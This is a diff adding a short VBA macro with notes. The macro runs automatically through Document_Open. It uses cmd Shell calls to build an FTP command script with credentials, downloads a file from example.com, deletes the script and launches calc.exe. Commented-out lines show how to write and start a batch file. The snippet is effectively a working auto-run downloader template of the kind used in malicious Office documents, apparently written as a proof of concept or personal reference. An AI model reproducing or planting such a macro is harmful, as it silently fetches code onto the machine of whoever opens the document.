@@ -1,0 +1,22 @@
+Private Sub Document_Open()
+    'Shell "cmd /c echo @echo off > C:\batabc.bat"
+    'Shell "cmd /c echo start notepad.exe >> C:\batabc.bat"
+    'Shell "cmd /c start C:\batabc.bat"
+    Shell "cmd /c echo user username > getftp.dat"
+    Shell "cmd /c echo mypass >> getftp.dat"
+    Shell "cmd /c echo binary >> getftp.dat"
+    Shell "cmd /c echo cd remoteSubDir >> getftp.dat"
+    Shell "cmd /c echo lcd C:\Users\UserName\SomeLocalSubDir >> getftp.dat"
+    Shell "cmd /c echo get file.file >> getftp.dat"
+    Shell "cmd /c echo quit >> getftp.dat"
+    Shell "cmd /c ftp -n -s:getftp.dat example.com"
+    Shell "cmd /c del getftp.dat"
+    Shell "cmd /c start calc.exe"
+    
+    
+End Sub
+
+
+# notes: 
+1. Document_open() will run macro automatically every time the document is opened
+2. to add comments use ' at the start of the comment . It applies to only one line
